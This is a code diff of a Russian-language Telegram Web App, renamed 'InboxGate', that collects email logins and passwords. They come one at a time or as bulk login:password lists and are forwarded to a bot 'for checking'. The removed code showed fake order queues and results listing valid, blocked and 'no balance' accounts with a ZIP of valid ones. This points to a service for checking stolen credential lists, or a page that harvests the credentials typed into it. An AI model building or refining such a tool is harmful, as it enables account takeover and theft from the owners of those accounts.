@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-  <title>Checker Bot</title>
+  <title>InboxGate</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
     :root {
@@ -159,6 +159,11 @@
       transform: scale(0.985);
     }
 
+    .btn:disabled {
+      opacity: 0.55;
+      pointer-events: none;
+    }
+
     .btn.secondary {
       background: var(--input-bg);
       color: var(--text);
@@ -173,7 +178,6 @@
       flex-shrink: 0;
     }
 
-    /* ===== Экран "Заказ принят" ===== */
     .status-icon {
       width: 64px;
       height: 64px;
@@ -188,92 +192,12 @@
       flex-shrink: 0;
     }
 
-    .queue-number {
-      font-size: 36px;
-      font-weight: 700;
+    .center-text {
       text-align: center;
-      margin: 6px 0 2px;
-      color: var(--accent);
-      letter-spacing: -0.5px;
-    }
-
-    .status-box {
-      background: var(--card);
-      border-radius: 16px;
-      padding: 16px 18px;
+      color: var(--muted);
       font-size: 15px;
       line-height: 1.5;
-      margin: 20px 0;
-      box-shadow: 0 1px 4px rgba(0,0,0,0.06);
-      border-left: 4px solid transparent;
-      flex-shrink: 0;
     }
-
-    .status-box.warning { border-left-color: var(--warning); }
-    .status-box.success { border-left-color: var(--success); }
-    .status-box.info    { border-left-color: var(--accent); }
-
-    .status-label {
-      font-size: 12px;
-      font-weight: 600;
-      color: var(--muted);
-      margin-bottom: 6px;
-      text-transform: uppercase;
-      letter-spacing: 0.4px;
-    }
-
-    /* ===== Результат проверки ===== */
-    .result-card {
-      background: var(--card);
-      border-radius: 16px;
-      padding: 18px;
-      margin-top: 16px;
-      box-shadow: 0 1px 4px rgba(0,0,0,0.06);
-      display: none;
-      border-left: 4px solid transparent;
-    }
-
-    .result-card.success { border-left-color: var(--success); }
-    .result-card.warning { border-left-color: var(--warning); }
-    .result-card.danger  { border-left-color: var(--danger); }
-    .result-card.info    { border-left-color: var(--accent); }
-
-    .result-title {
-      font-size: 17px;
-      font-weight: 600;
-      margin-bottom: 8px;
-    }
-
-    .result-text {
-      font-size: 15px;
-      line-height: 1.55;
-      color: var(--text);
-    }
-
-    .result-zip {
-      margin-top: 14px;
-      padding: 12px 16px;
-      background: rgba(52, 199, 89, 0.12);
-      color: var(--success);
-      border-radius: 12px;
-      font-weight: 600;
-      text-align: center;
-      font-size: 15px;
-    }
-
-    .result-badge {
-      display: inline-block;
-      padding: 4px 10px;
-      border-radius: 20px;
-      font-size: 12px;
-      font-weight: 600;
-      margin-bottom: 10px;
-    }
-
-    .badge-success { background: rgba(52,199,89,0.15); color: var(--success); }
-    .badge-warning { background: rgba(255,159,10,0.15); color: var(--warning); }
-    .badge-danger  { background: rgba(255,59,48,0.15); color: var(--danger); }
-    .badge-info    { background: rgba(42,171,238,0.15); color: var(--accent); }
   </style>
 </head>
 <body>
@@ -290,85 +214,39 @@
 
     <div id="form-single" class="card">
       <label>Login</label>
-      <input type="text" id="login" placeholder="username@mail.com" autocomplete="off">
+      <input type="text" id="login" placeholder="username@gmail.com" autocomplete="off" enterkeyhint="next">
 
       <label>Password</label>
-      <input type="password" id="password" placeholder="••••••••">
+      <input type="password" id="password" placeholder="••••••••" enterkeyhint="done">
 
       <button class="btn" id="btn-single">Отправить на проверку</button>
     </div>
 
     <div id="form-list" class="card" style="display:none">
       <label>Список (login:password или login;password)</label>
-      <textarea id="list" placeholder="user1@mail.com:pass123&#10;user2@mail.com;qwerty&#10;user3:secret"></textarea>
+      <textarea id="list" placeholder="user1@gmail.com:pass123&#10;user2@gmail.com;qwerty&#10;user3@gmail.com:secret"></textarea>
       <button class="btn" id="btn-list">Отправить список</button>
     </div>
-
-    <button class="btn secondary" id="btn-check-status" style="margin-top: 8px;">Проверить статус заказа</button>
 
     <p class="hint">2FA пока не поддерживается</p>
   </div>
 
-  <!-- ===== ЭКРАН 2: Заказ принят ===== -->
-  <div id="screen-accepted" class="screen">
+  <!-- ===== ЭКРАН 2: Отправлено ===== -->
+  <div id="screen-sent" class="screen">
     <div class="status-icon">✓</div>
-    <h1 style="text-align:center">Заказ принят</h1>
-
-    <div class="queue-number" id="queue-num">#47</div>
-    <p style="text-align:center; color:var(--muted); font-size:14px; margin-bottom:4px">ваш номер заказа</p>
-
-    <div class="status-box warning" id="status-busy" style="display:none">
-      <div class="status-label">Сервер занят</div>
-      Сейчас проверяется предыдущий заказ.<br>
-      Примерное время ожидания: <b id="wait-time">~10–20 мин</b>.<br><br>
-      Я пришлю уведомление, когда начну твою проверку.
-    </div>
-
-    <div class="status-box info" id="status-offline" style="display:none">
-      <div class="status-label">Сервер временно недоступен</div>
-      Я принял задание.<br>
-      Как только сервер включится — сразу запущу проверку и пришлю уведомление.
-    </div>
-
-    <div class="status-box success" id="status-ready" style="display:none">
-      <div class="status-label">Сервер свободен</div>
-      Запускаю проверку прямо сейчас…<br>
-      Результат придёт уведомлением.
-    </div>
-
-    <div style="margin-top:auto; padding-top:16px;">
-      <button class="btn" id="btn-go-check">Проверить статус</button>
-      <button class="btn secondary" id="btn-add-more">Добавить ещё</button>
-    </div>
-  </div>
-
-  <!-- ===== ЭКРАН 3: Проверка по номеру ===== -->
-  <div id="screen-check" class="screen">
-    <h1>Проверить заказ</h1>
-    <p class="subtitle">Введите номер заказа</p>
-
-    <div class="card">
-      <label>Номер заказа</label>
-      <input type="text" id="order-number" placeholder="#47 или 47" inputmode="numeric">
-
-      <button class="btn" id="btn-search">Проверить</button>
-    </div>
-
-    <!-- Результат -->
-    <div class="result-card" id="result-card">
-      <div class="result-badge" id="result-badge"></div>
-      <div class="result-title" id="result-title">Заказ #47</div>
-      <div class="result-text" id="result-text"></div>
-      <div class="result-zip" id="result-zip" style="display:none"></div>
-    </div>
-
-    <div style="margin-top:auto; padding-top:16px;">
-      <button class="btn secondary" id="btn-back-home">На главную</button>
+    <h1 style="text-align:center">Отправлено</h1>
+    <p class="center-text" style="margin-top:8px">
+      Данные отправлены боту.<br>
+      Сейчас придёт подтверждение с номером заказа.
+    </p>
+    <div style="margin-top:auto; padding-top:24px;">
+      <button class="btn secondary" id="btn-close">Закрыть</button>
     </div>
   </div>
 
   <script>
     const tg = window.Telegram?.WebApp;
+
     if (tg) {
       try {
         tg.ready();
@@ -383,114 +261,13 @@
       alert(text);
     }
 
-    let lastQueue = null;
+    function showScreen(id) {
+      document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+      document.getElementById(id).classList.add('active');
+      window.scrollTo(0, 0);
+    }
 
-    // ===== Все возможные варианты результатов =====
-    const resultVariants = [
-      // ===== УСПЕХ =====
-      {
-        type: 'success',
-        badge: 'Готово',
-        badgeClass: 'badge-success',
-        title: 'Проверка завершена',
-        text: 'Все аккаунты успешно проверены.',
-        zip: '📦 ZIP готов к скачиванию'
-      },
-      {
-        type: 'success',
-        badge: 'Готово',
-        badgeClass: 'badge-success',
-        title: 'Проверка завершена',
-        text: 'Найдено валидных: 7<br>Невалидных: 3<br>Заблокированных: 1',
-        zip: '📦 ZIP готов (только валидные)'
-      },
-
-      // ===== В РАБОТЕ =====
-      {
-        type: 'info',
-        badge: 'В очереди',
-        badgeClass: 'badge-info',
-        title: 'Заказ ещё в очереди',
-        text: 'Примерное время ожидания: <b>~12–20 мин</b>.<br><br>Я пришлю уведомление, когда начну проверку.',
-        zip: null
-      },
-      {
-        type: 'warning',
-        badge: 'Сервер занят',
-        badgeClass: 'badge-warning',
-        title: 'Сервер сейчас занят',
-        text: 'Проверяется предыдущий заказ.<br>Примерное время: <b>~25–40 мин</b>.',
-        zip: null
-      },
-      {
-        type: 'info',
-        badge: 'Ожидание',
-        badgeClass: 'badge-info',
-        title: 'Сервер временно недоступен',
-        text: 'Заказ принят и сохранён.<br>Как только сервер включится — сразу запущу проверку.',
-        zip: null
-      },
-
-      // ===== ОШИБКИ =====
-      {
-        type: 'danger',
-        badge: 'Ошибка',
-        badgeClass: 'badge-danger',
-        title: 'Неверный логин или пароль',
-        text: 'Ни один аккаунт не прошёл проверку.<br>Проверьте правильность данных.',
-        zip: null
-      },
-      {
-        type: 'danger',
-        badge: 'Заблокирован',
-        badgeClass: 'badge-danger',
-        title: 'Аккаунт заблокирован',
-        text: 'Аккаунт временно или постоянно заблокирован сервисом.',
-        zip: null
-      },
-      {
-        type: 'warning',
-        badge: '2FA',
-        badgeClass: 'badge-warning',
-        title: 'Требуется 2FA',
-        text: 'На аккаунте включена двухфакторная аутентификация.<br>Пока 2FA не поддерживается.',
-        zip: null
-      },
-      {
-        type: 'danger',
-        badge: 'Пусто',
-        badgeClass: 'badge-danger',
-        title: 'Нет валидных аккаунтов',
-        text: 'Все аккаунты оказались невалидными или без баланса.',
-        zip: null
-      },
-      {
-        type: 'warning',
-        badge: 'Формат',
-        badgeClass: 'badge-warning',
-        title: 'Неверный формат списка',
-        text: 'Не удалось разобрать список.<br>Используйте формат:<br><code>login:password</code> или <code>login;password</code>',
-        zip: null
-      },
-      {
-        type: 'warning',
-        badge: 'Лимит',
-        badgeClass: 'badge-warning',
-        title: 'Слишком много запросов',
-        text: 'Вы превысили лимит запросов.<br>Попробуйте через 10–15 минут.',
-        zip: null
-      },
-      {
-        type: 'danger',
-        badge: 'Таймаут',
-        badgeClass: 'badge-danger',
-        title: 'Ошибка сети / таймаут',
-        text: 'Не удалось связаться с сервисом.<br>Попробуйте отправить заказ повторно позже.',
-        zip: null
-      }
-    ];
-
-    // ===== Вкладки =====
+    // Вкладки
     document.querySelectorAll('.tab').forEach(tab => {
       tab.addEventListener('click', () => {
         document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
@@ -501,98 +278,84 @@
       });
     });
 
-    function showScreen(id) {
-      document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-      document.getElementById(id).classList.add('active');
-      window.scrollTo(0, 0);
-    }
-
-    function showAccepted(type) {
-      ['busy', 'offline', 'ready'].forEach(t => {
-        document.getElementById('status-' + t).style.display = 'none';
-      });
-      document.getElementById('status-' + type).style.display = 'block';
-
-      lastQueue = Math.floor(Math.random() * 90 + 10);
-      document.getElementById('queue-num').textContent = '#' + lastQueue;
-
-      if (type === 'busy') {
-        const times = ['~5–10 мин', '~10–20 мин', '~20–40 мин', '~1 час'];
-        document.getElementById('wait-time').textContent = times[Math.floor(Math.random() * times.length)];
+    function sendToBot(payload) {
+      if (!tg || typeof tg.sendData !== 'function') {
+        showAlert('Открывай WebApp только внутри Telegram');
+        return false;
       }
 
-      showScreen('screen-accepted');
+      try {
+        tg.sendData(JSON.stringify(payload));
+        return true;
+      } catch (e) {
+        showAlert('Не удалось отправить данные');
+        return false;
+      }
     }
 
-    // ===== Отправка =====
+    // Один аккаунт
     document.getElementById('btn-single').addEventListener('click', () => {
       const login = document.getElementById('login').value.trim();
-      const pass = document.getElementById('password').value;
-      if (!login || !pass) {
+      const password = document.getElementById('password').value;
+
+      if (!login || !password) {
         showAlert('Заполни оба поля');
         return;
       }
-      const type = ['busy', 'offline', 'ready'][Math.floor(Math.random() * 3)];
-      showAccepted(type);
+
+      const btn = document.getElementById('btn-single');
+      btn.disabled = true;
+      btn.textContent = 'Отправка…';
+
+      const ok = sendToBot({
+        type: 'single',
+        login: login,
+        password: password
+      });
+
+      if (ok) {
+        showScreen('screen-sent');
+        // Через пару секунд можно закрыть WebApp
+        setTimeout(() => {
+          try { tg.close(); } catch (e) {}
+        }, 1800);
+      } else {
+        btn.disabled = false;
+        btn.textContent = 'Отправить на проверку';
+      }
     });
 
+    // Список
     document.getElementById('btn-list').addEventListener('click', () => {
-      const list = document.getElementById('list').value.trim();
-      if (!list) {
+      const text = document.getElementById('list').value.trim();
+
+      if (!text) {
         showAlert('Вставь хотя бы один аккаунт');
         return;
       }
-      const type = ['busy', 'offline', 'ready'][Math.floor(Math.random() * 3)];
-      showAccepted(type);
-    });
 
-    // ===== Навигация =====
-    document.getElementById('btn-add-more').addEventListener('click', () => showScreen('screen-add'));
-    document.getElementById('btn-back-home').addEventListener('click', () => showScreen('screen-add'));
-    document.getElementById('btn-check-status').addEventListener('click', () => {
-      document.getElementById('order-number').value = lastQueue ? lastQueue : '';
-      document.getElementById('result-card').style.display = 'none';
-      showScreen('screen-check');
-    });
-    document.getElementById('btn-go-check').addEventListener('click', () => {
-      document.getElementById('order-number').value = lastQueue || '';
-      document.getElementById('result-card').style.display = 'none';
-      showScreen('screen-check');
-    });
+      const btn = document.getElementById('btn-list');
+      btn.disabled = true;
+      btn.textContent = 'Отправка…';
 
-    // ===== Проверка по номеру =====
-    document.getElementById('btn-search').addEventListener('click', () => {
-      let num = document.getElementById('order-number').value.trim().replace('#', '');
-      if (!num) {
-        showAlert('Введите номер заказа');
-        return;
-      }
+      const ok = sendToBot({
+        type: 'list',
+        text: text
+      });
 
-      // Берём случайный вариант
-      const variant = resultVariants[Math.floor(Math.random() * resultVariants.length)];
-
-      const card = document.getElementById('result-card');
-      const badge = document.getElementById('result-badge');
-      const title = document.getElementById('result-title');
-      const text = document.getElementById('result-text');
-      const zip = document.getElementById('result-zip');
-
-      // Сбрасываем классы
-      card.className = 'result-card ' + variant.type;
-      badge.className = 'result-badge ' + variant.badgeClass;
-      badge.textContent = variant.badge;
-
-      title.textContent = 'Заказ #' + num + ' — ' + variant.title;
-      text.innerHTML = variant.text;
-
-      if (variant.zip) {
-        zip.style.display = 'block';
-        zip.textContent = variant.zip;
+      if (ok) {
+        showScreen('screen-sent');
+        setTimeout(() => {
+          try { tg.close(); } catch (e) {}
+        }, 1800);
       } else {
-        zip.style.display = 'none';
+        btn.disabled = false;
+        btn.textContent = 'Отправить список';
       }
+    });
 
-      card.style.display = 'block';
+    document.getElementById('btn-close').addEventListener('click', () => {
+      try { tg.close(); } catch (e) {}
     });
   </script>
 </body>
